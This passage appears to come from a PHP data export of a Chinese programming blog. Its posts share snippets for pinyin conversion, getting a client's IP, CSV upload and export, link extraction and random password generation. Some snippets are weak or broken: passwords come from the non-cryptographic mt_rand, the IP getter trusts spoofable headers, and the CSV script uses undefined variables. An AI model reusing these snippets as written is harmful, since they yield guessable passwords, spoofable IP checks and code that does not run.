&nbsp;&nbsp;&nbsp;&nbsp;&quot;|nei|nen|neng|ni|nian|niang|niao|nie|nin|ning|niu|nong|nu|nv|nuan|nue|nuo|o|ou|pa|pai|pan|pang|pao|pei|pen&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|peng|pi|pian|piao|pie|pin|ping|po|pu|qi|qia|qian|qiang|qiao|qie|qin|qing|qiong|qiu|qu|quan|que|qun|ran|rang&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|rao|re|ren|reng|ri|rong|rou|ru|ruan|rui|run|ruo|sa|sai|san|sang|sao|se|sen|seng|sha|shai|shan|shang|shao|&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;she|shen|sheng|shi|shou|shu|shua|shuai|shuan|shuang|shui|shun|shuo|si|song|sou|su|suan|sui|sun|suo|ta|tai|&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;tan|tang|tao|te|teng|ti|tian|tiao|tie|ting|tong|tou|tu|tuan|tui|tun|tuo|wa|wai|wan|wang|wei|wen|weng|wo|wu&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|xi|xia|xian|xiang|xiao|xie|xin|xing|xiong|xiu|xu|xuan|xue|xun|ya|yan|yang|yao|ye|yi|yin|ying|yo|yong|you&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|yu|yuan|yue|yun|za|zai|zan|zang|zao|ze|zei|zen|zeng|zha|zhai|zhan|zhang|zhao|zhe|zhen|zheng|zhi|zhong|&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;zhou|zhu|zhua|zhuai|zhuan|zhuang|zhui|zhun|zhuo|zi|zong|zou|zu|zuan|zui|zun|zuo&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;$_DataValue&nbsp;=&nbsp;&quot;-20319|-20317|-20304|-20295|-20292|-20283|-20265|-20257|-20242|-20230|-20051|-20036|-20032|-20026|-20002|-19990&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-19986|-19982|-19976|-19805|-19784|-19775|-19774|-19763|-19756|-19751|-19746|-19741|-19739|-19728|-19725&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-19715|-19540|-19531|-19525|-19515|-19500|-19484|-19479|-19467|-19289|-19288|-19281|-19275|-19270|-19263&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-19261|-19249|-19243|-19242|-19238|-19235|-19227|-19224|-19218|-19212|-19038|-19023|-19018|-19006|-19003&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-18996|-18977|-18961|-18952|-18783|-18774|-18773|-18763|-18756|-18741|-18735|-18731|-18722|-18710|-18697&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-18696|-18526|-18518|-18501|-18490|-18478|-18463|-18448|-18447|-18446|-18239|-18237|-18231|-18220|-18211&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-18201|-18184|-18183|-18181|-18012|-17997|-17988|-17970|-17964|-17961|-17950|-17947|-17931|-17928|-17922&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-17759|-17752|-17733|-17730|-17721|-17703|-17701|-17697|-17692|-17683|-17676|-17496|-17487|-17482|-17468&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-17454|-17433|-17427|-17417|-17202|-17185|-16983|-16970|-16942|-16915|-16733|-16708|-16706|-16689|-16664&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-16657|-16647|-16474|-16470|-16465|-16459|-16452|-16448|-16433|-16429|-16427|-16423|-16419|-16412|-16407&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-16403|-16401|-16393|-16220|-16216|-16212|-16205|-16202|-16187|-16180|-16171|-16169|-16158|-16155|-15959&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-15958|-15944|-15933|-15920|-15915|-15903|-15889|-15878|-15707|-15701|-15681|-15667|-15661|-15659|-15652&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-15640|-15631|-15625|-15454|-15448|-15436|-15435|-15419|-15416|-15408|-15394|-15385|-15377|-15375|-15369&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-15363|-15362|-15183|-15180|-15165|-15158|-15153|-15150|-15149|-15144|-15143|-15141|-15140|-15139|-15128&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-15121|-15119|-15117|-15110|-15109|-14941|-14937|-14933|-14930|-14929|-14928|-14926|-14922|-14921|-14914&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-14908|-14902|-14894|-14889|-14882|-14873|-14871|-14857|-14678|-14674|-14670|-14668|-14663|-14654|-14645&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-14630|-14594|-14429|-14407|-14399|-14384|-14379|-14368|-14355|-14353|-14345|-14170|-14159|-14151|-14149&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-14145|-14140|-14137|-14135|-14125|-14123|-14122|-14112|-14109|-14099|-14097|-14094|-14092|-14090|-14087&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-14083|-13917|-13914|-13910|-13907|-13906|-13905|-13896|-13894|-13878|-13870|-13859|-13847|-13831|-13658&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-13611|-13601|-13406|-13404|-13400|-13398|-13395|-13391|-13387|-13383|-13367|-13359|-13356|-13343|-13340&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-13329|-13326|-13318|-13147|-13138|-13120|-13107|-13096|-13095|-13091|-13076|-13068|-13063|-13060|-12888&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-12875|-12871|-12860|-12858|-12852|-12849|-12838|-12831|-12829|-12812|-12802|-12607|-12597|-12594|-12585&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-12556|-12359|-12346|-12320|-12300|-12120|-12099|-12089|-12074|-12067|-12058|-12039|-11867|-11861|-11847&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-11831|-11798|-11781|-11604|-11589|-11536|-11358|-11340|-11339|-11324|-11303|-11097|-11077|-11067|-11055&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-11052|-11045|-11041|-11038|-11024|-11020|-11019|-11018|-11014|-10838|-10832|-10815|-10800|-10790|-10780&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-10764|-10587|-10544|-10533|-10519|-10331|-10329|-10328|-10322|-10315|-10309|-10307|-10296|-10281|-10274&quot;.
&nbsp;&nbsp;&nbsp;&nbsp;&quot;|-10270|-10262|-10260|-10256|-10254&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;$_TDataKey&nbsp;=&nbsp;explode(&#39;|&#39;,&nbsp;$_DataKey);
&nbsp;&nbsp;&nbsp;&nbsp;$_TDataValue&nbsp;=&nbsp;explode(&#39;|&#39;,&nbsp;$_DataValue);
&nbsp;&nbsp;&nbsp;&nbsp;$_Data&nbsp;=&nbsp;(PHP_VERSION&gt;=&#39;5.0&#39;)&nbsp;?&nbsp;array_combine($_TDataKey,&nbsp;$_TDataValue)&nbsp;:&nbsp;_Array_Combine($_TDataKey,&nbsp;$_TDataValue);
&nbsp;&nbsp;&nbsp;&nbsp;arsort($_Data);
&nbsp;&nbsp;&nbsp;&nbsp;reset($_Data);
&nbsp;&nbsp;&nbsp;&nbsp;if($_Code&nbsp;!=&nbsp;&#39;gb2312&#39;)&nbsp;$_String&nbsp;=&nbsp;_U2_Utf8_Gb($_String);
&nbsp;&nbsp;&nbsp;&nbsp;$_Res&nbsp;=&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;for($i=0;&nbsp;$i&lt;strlen($_String);&nbsp;$i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_P&nbsp;=&nbsp;ord(substr($_String,&nbsp;$i,&nbsp;1));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($_P&gt;160)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_Q&nbsp;=&nbsp;ord(substr($_String,&nbsp;++$i,&nbsp;1));&nbsp;$_P&nbsp;=&nbsp;$_P*256&nbsp;+&nbsp;$_Q&nbsp;-&nbsp;65536;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_Res&nbsp;.=&nbsp;_Pinyin($_P,&nbsp;$_Data);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;preg_replace(&quot;/[^a-z0-9]*/&quot;,&nbsp;&#39;&#39;,&nbsp;$_Res);
}
function&nbsp;_Pinyin($_Num,&nbsp;$_Data)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($_Num&gt;0&nbsp;&amp;&amp;&nbsp;$_Num&lt;160&nbsp;)&nbsp;return&nbsp;chr($_Num);
&nbsp;&nbsp;&nbsp;&nbsp;elseif($_Num&lt;-20319&nbsp;||&nbsp;$_Num&gt;-10247)&nbsp;return&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($_Data&nbsp;as&nbsp;$k=&gt;$v){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($v&lt;=$_Num)&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$k;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
function&nbsp;_U2_Utf8_Gb($_C)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;=&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;if($_C&nbsp;&lt;&nbsp;0x80)&nbsp;$_String&nbsp;.=&nbsp;$_C;
&nbsp;&nbsp;&nbsp;&nbsp;elseif($_C&nbsp;&lt;&nbsp;0x800){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0xC0&nbsp;|&nbsp;$_C&gt;&gt;6);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0x80&nbsp;|&nbsp;$_C&nbsp;&amp;&nbsp;0x3F);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;elseif($_C&nbsp;&lt;&nbsp;0x10000)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0xE0&nbsp;|&nbsp;$_C&gt;&gt;12);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0x80&nbsp;|&nbsp;$_C&gt;&gt;6&nbsp;&amp;&nbsp;0x3F);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0x80&nbsp;|&nbsp;$_C&nbsp;&amp;&nbsp;0x3F);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;elseif($_C&nbsp;&lt;&nbsp;0x200000)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0xF0&nbsp;|&nbsp;$_C&gt;&gt;18);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0x80&nbsp;|&nbsp;$_C&gt;&gt;12&nbsp;&amp;&nbsp;0x3F);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0x80&nbsp;|&nbsp;$_C&gt;&gt;6&nbsp;&amp;&nbsp;0x3F);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_String&nbsp;.=&nbsp;chr(0x80&nbsp;|&nbsp;$_C&nbsp;&amp;&nbsp;0x3F);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;iconv(&#39;UTF-8&#39;,&nbsp;&#39;GB2312&#39;,&nbsp;$_String);
}
function&nbsp;_Array_Combine($_Arr1,&nbsp;$_Arr2)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;for($i=0;&nbsp;$i&lt;count($_Arr1);&nbsp;$i++)&nbsp;$_Res[$_Arr1[$i]]&nbsp;=&nbsp;$_Arr2[$i];
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$_Res;
}
//用法：
//第二个参数留空则为gb1232编码
//第二个参数随意设置则为utf-8编码
echo&nbsp;Pinyin(&#39;123&nbsp;你好123wangyongdong&#39;);

/*&nbsp;$s=&#39;a爱上&#39;;
if&nbsp;(ord($s)&gt;128)&nbsp;echo&nbsp;&#39;中文开头&#39;;&nbsp;*/</pre><p><br/></p>',
            'keyword' => 'php,拼音,转换',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 10:23:17',
          ),
          80 => 
          array (
            'id' => '5',
            'uid' => '1',
            'title' => 'php 完整版获取客户端ip地址',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">&lt;?Php
function&nbsp;get_ip(){
if(getenv(&#39;HTTP_CLIENT_IP&#39;)&nbsp;&amp;&amp;&nbsp;strcasecmp(getenv(&#39;HTTP_CLIENT_IP&#39;),&nbsp;&#39;unknown&#39;))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$onlineip&nbsp;=&nbsp;getenv(&#39;HTTP_CLIENT_IP&#39;);
}&nbsp;elseif(getenv(&#39;HTTP_X_FORWARDED_FOR&#39;)&nbsp;&amp;&amp;&nbsp;strcasecmp(getenv(&#39;HTTP_X_FORWARDED_FOR&#39;),&nbsp;&#39;unknown&#39;))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$onlineip&nbsp;=&nbsp;getenv(&#39;HTTP_X_FORWARDED_FOR&#39;);
}&nbsp;elseif(getenv(&#39;REMOTE_ADDR&#39;)&nbsp;&amp;&amp;&nbsp;strcasecmp(getenv(&#39;REMOTE_ADDR&#39;),&nbsp;&#39;unknown&#39;))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$onlineip&nbsp;=&nbsp;getenv(&#39;REMOTE_ADDR&#39;);
}&nbsp;elseif(isset($_SERVER[&#39;REMOTE_ADDR&#39;])&nbsp;&amp;&amp;&nbsp;$_SERVER[&#39;REMOTE_ADDR&#39;]&nbsp;&amp;&amp;&nbsp;strcasecmp($_SERVER[&#39;REMOTE_ADDR&#39;],&nbsp;&#39;unknown&#39;))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$onlineip&nbsp;=&nbsp;$_SERVER[&#39;REMOTE_ADDR&#39;];
}

preg_match(&quot;/[\\\\d\\\\.]{7,15}/&quot;,&nbsp;$onlineip,&nbsp;$onlineipmatches);
$onlineip&nbsp;=&nbsp;$onlineipmatches[0]&nbsp;?&nbsp;$onlineipmatches[0]&nbsp;:&nbsp;&#39;unknown&#39;;
unset($onlineipmatches);

return&nbsp;$onlineip;
}
echo&nbsp;get_ip();</pre><p><br/></p>',
            'keyword' => 'php,IP',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 10:22:18',
          ),
          81 => 
          array (
            'id' => '4',
            'uid' => '1',
            'title' => 'php 上传cvs文件并读取，重新生成cvs文件',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">&lt;?php
//校验上传文件类型
if(empty($_FILES[&#39;csv&#39;][&#39;error&#39;]))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$sFileExt&nbsp;=&nbsp;strtolower(substr($_FILES[&#39;csv&#39;][&#39;name&#39;],&nbsp;-3));&nbsp;//获取后缀名
&nbsp;&nbsp;&nbsp;&nbsp;if($sFileExt&nbsp;!=&nbsp;&#39;csv&#39;){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Page::error(&#39;上传文件必须是csv文件&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;$sFileName&nbsp;=&nbsp;$_FILES[&#39;csv&#39;][&#39;tmp_name&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;$oFile&nbsp;=&nbsp;fopen($sFileName,&nbsp;&#39;r&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;$aSameNick&nbsp;=&nbsp;array();
&nbsp;&nbsp;&nbsp;&nbsp;while(($aRow&nbsp;=&nbsp;fgetcsv($oFile,&nbsp;10000))&nbsp;!==&nbsp;false)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$list[]&nbsp;=&nbsp;$aRow;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;fclose($oFile);
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//确定文件名
&nbsp;&nbsp;&nbsp;&nbsp;$sFilename&nbsp;=&nbsp;&quot;cvs生成_&quot;&nbsp;.&nbsp;time().&nbsp;&quot;.csv&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;$sFilename&nbsp;=&nbsp;mb_convert_encoding($sFilename,&nbsp;&#39;gbk&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-type:application/vnd.ms-excel&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-Disposition:filename=&quot;&nbsp;.&nbsp;$sFilename);
&nbsp;&nbsp;&nbsp;&nbsp;//导出生成的短链接
&nbsp;&nbsp;&nbsp;&nbsp;$sOut&nbsp;=&nbsp;&quot;手机,短链接,长链接,姓名,userid&quot;.&quot;\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;$sOut&nbsp;=&nbsp;mb_convert_encoding($sOut,&nbsp;&#39;gbk&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$sOut;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;foreach($arr&nbsp;as&nbsp;$key&nbsp;=&gt;&nbsp;$val){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sOut&nbsp;=&nbsp;&quot;\\\\&quot;{$mobile}\\\\&quot;,&quot;&nbsp;.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\\\\&quot;{$valurl_short}\\\\&quot;,&quot;&nbsp;.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\\\\&quot;{$valurl_real}\\\\&quot;,&quot;&nbsp;.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\\\\&quot;{$valuserName}\\\\&quot;,&quot;&nbsp;.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\\\\&quot;{$valuserId}\\\\&quot;,\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sOut&nbsp;=&nbsp;mb_convert_encoding($sOut,&nbsp;&#39;gbk&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$sOut;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
?&gt;</pre><p><br/></p>',
            'keyword' => 'php,cvs',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 10:21:46',
          ),
          82 => 
          array (
            'id' => '3',
            'uid' => '1',
            'title' => '（转）PHP代码：获取指定URL页面中的所有链接',
            'content' => '<p>以下代码可以获取到指定URL页面中的所有链接，即所有a标签的href属性：</p><pre class=\\"brush:php;toolbar:false\\">//&nbsp;获取链接的HTML代码
$html&nbsp;=&nbsp;file_get_contents(&#39;http://www.example.com&#39;);

$dom&nbsp;=&nbsp;new&nbsp;DOMDocument();
@$dom-&gt;loadHTML($html);

$xpath&nbsp;=&nbsp;new&nbsp;DOMXPath($dom);
$hrefs&nbsp;=&nbsp;$xpath-&gt;evaluate(&#39;/html/body//a&#39;);

for&nbsp;($i&nbsp;=&nbsp;0;&nbsp;$i&nbsp;&lt;&nbsp;$hrefs-&gt;length;&nbsp;$i++)&nbsp;{
$href&nbsp;=&nbsp;$hrefs-&gt;item($i);
$url&nbsp;=&nbsp;$href-&gt;getAttribute(&#39;href&#39;);
echo&nbsp;$url.&#39;&lt;br&nbsp;/&gt;&#39;;
}</pre><p>这段代码会获取到所有a标签的href属性，但是href属性值不一定是链接，我们可以在做个过滤，只保留http开头的链接地址：</p><pre class=\\"brush:php;toolbar:false\\">//&nbsp;获取链接的HTML代码
$html&nbsp;=&nbsp;file_get_contents(&#39;http://www.example.com&#39;);

$dom&nbsp;=&nbsp;new&nbsp;DOMDocument();
@$dom-&gt;loadHTML($html);

$xpath&nbsp;=&nbsp;new&nbsp;DOMXPath($dom);
$hrefs&nbsp;=&nbsp;$xpath-&gt;evaluate(&#39;/html/body//a&#39;);

for&nbsp;($i&nbsp;=&nbsp;0;&nbsp;$i&nbsp;&lt;&nbsp;$hrefs-&gt;length;&nbsp;$i++)&nbsp;{
$href&nbsp;=&nbsp;$hrefs-&gt;item($i);
$url&nbsp;=&nbsp;$href-&gt;getAttribute(&#39;href&#39;);

//&nbsp;保留以http开头的链接
if(substr($url,&nbsp;0,&nbsp;4)&nbsp;==&nbsp;&#39;http&#39;)
echo&nbsp;$url.&#39;&lt;br&nbsp;/&gt;&#39;;
}</pre><p>文章转自：http://www.php100.com/html/it/biancheng/2015/0422/8927.html</p>',
            'keyword' => 'php,链接',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 10:20:15',
          ),
          83 => 
          array (
            'id' => '2',
            'uid' => '1',
            'title' => '（转）PHP生成随机密码的4种方法及性能对比',
            'content' => '<p><span style=\\"color: #000000;\\"><strong>[导读]</strong></span> 使用PHP开发应用程序，尤其是网站程序，常常需要生成随机密码，如用户注册生成随机密码，用户重置密码也需要生成一个随机的密码。随机密码也就是一串固定长度的字符串，这里我收集整理了几种生成随机字符串的方法，以供大家参考。</p><h2 id=\\"title-0\\">方法一：</h2><p>1、在 33 – 126 中生成一个随机整数，如 35，</p><p>2、将 35 转换成对应的ASCII码字符，如 35 对应 #</p><p>3、重复以上 1、2 步骤 n 次，连接成 n 位的密码</p><p>该算法主要用到了两个函数，<a href=\\"http://www.w3school.com.cn/php/func_math_mt_rand.asp\\" rel=\\"nofollow\\" target=\\"_blank\\">mt_rand ( int $min , int $max )</a>函数用于生成随机整数，其中 $min – $max 为 ASCII 码的范围，这里取 33 -126 ，可以根据需要调整范围，如ASCII码表中 97 – 122 位对应 a – z 的英文字母，具体可参考 <a href=\\"http://www.asciitable.com/\\" rel=\\"nofollow\\" target=\\"_blank\\">ASCII码表</a>； <a href=\\"http://www.w3school.com.cn/php/func_string_chr.asp\\" rel=\\"nofollow\\" target=\\"_blank\\">chr ( int $ascii )</a>函数用于将对应整数 $ascii 转换成对应的字符。</p><pre class=\\"brush:php;toolbar:false\\">function&nbsp;create_password($pw_length&nbsp;=&nbsp;8)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$randpwd&nbsp;=&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;($i&nbsp;=&nbsp;0;&nbsp;$i&nbsp;&lt;&nbsp;$pw_length;&nbsp;$i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$randpwd&nbsp;.=&nbsp;chr(mt_rand(33,&nbsp;126));
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$randpwd;
}

//&nbsp;调用该函数，传递长度参数$pw_length&nbsp;=&nbsp;6
echo&nbsp;create_password(6);</pre><h2 id=\\"title-1\\">方法二：</h2><p>1、预置一个的字符串 $chars ，包括 a – z，A – Z，0 – 9，以及一些特殊字符</p><p>2、在 $chars 字符串中随机取一个字符</p><p>3、重复第二步 n 次，可得长度为 n 的密码</p><pre class=\\"brush:php;toolbar:false\\">function&nbsp;generate_password(&nbsp;$length&nbsp;=&nbsp;8&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;密码字符集，可任意添加你需要的字符
&nbsp;&nbsp;&nbsp;&nbsp;$chars&nbsp;=&nbsp;&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_&nbsp;[]{}&lt;&gt;~`+=,.;:/?|&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;$password&nbsp;=&nbsp;&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(&nbsp;$i&nbsp;=&nbsp;0;&nbsp;$i&nbsp;&lt;&nbsp;$length;&nbsp;$i++&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;这里提供两种字符获取方式
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;第一种是使用&nbsp;substr&nbsp;截取$chars中的任意一位字符；
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;第二种是取字符数组&nbsp;$chars&nbsp;的任意元素
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;$password&nbsp;.=&nbsp;substr($chars,&nbsp;mt_rand(0,&nbsp;strlen($chars)&nbsp;-&nbsp;1),&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$password&nbsp;.=&nbsp;$chars[&nbsp;mt_rand(0,&nbsp;strlen($chars)&nbsp;-&nbsp;1)&nbsp;];
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$password;
}</pre><h2 id=\\"title-2\\">方法三：</h2><p>1、预置一个的字符数组 $chars ，包括 a – z，A – Z，0 – 9，以及一些特殊字符</p><p>2、通过<a href=\\"http://www.w3school.com.cn/php/func_array_rand.asp\\" rel=\\"nofollow\\" target=\\"_blank\\">array_rand()</a>从数组 $chars 中随机选出 $length 个元素</p><p>3、根据已获取的键名数组 $keys，从数组 $chars 取出字符拼接字符串。该方法的缺点是相同的字符不会重复取。</p><pre class=\\"brush:php;toolbar:false\\">function&nbsp;make_password(&nbsp;$length&nbsp;=&nbsp;8&nbsp;)&nbsp;{
　　//&nbsp;密码字符集，可任意添加你需要的字符
$chars&nbsp;=&nbsp;array(&#39;a&#39;,&nbsp;&#39;b&#39;,&nbsp;&#39;c&#39;,&nbsp;&#39;d&#39;,&nbsp;&#39;e&#39;,&nbsp;&#39;f&#39;,&nbsp;&#39;g&#39;,&nbsp;&#39;h&#39;,
&#39;i&#39;,&nbsp;&#39;j&#39;,&nbsp;&#39;k&#39;,&nbsp;&#39;l&#39;,&#39;m&#39;,&nbsp;&#39;n&#39;,&nbsp;&#39;o&#39;,&nbsp;&#39;p&#39;,&nbsp;&#39;q&#39;,&nbsp;&#39;r&#39;,&nbsp;&#39;s&#39;,
&#39;t&#39;,&nbsp;&#39;u&#39;,&nbsp;&#39;v&#39;,&nbsp;&#39;w&#39;,&nbsp;&#39;x&#39;,&nbsp;&#39;y&#39;,&#39;z&#39;,&nbsp;&#39;A&#39;,&nbsp;&#39;B&#39;,&nbsp;&#39;C&#39;,&nbsp;&#39;D&#39;,
&#39;E&#39;,&nbsp;&#39;F&#39;,&nbsp;&#39;G&#39;,&nbsp;&#39;H&#39;,&nbsp;&#39;I&#39;,&nbsp;&#39;J&#39;,&nbsp;&#39;K&#39;,&nbsp;&#39;L&#39;,&#39;M&#39;,&nbsp;&#39;N&#39;,&nbsp;&#39;O&#39;,
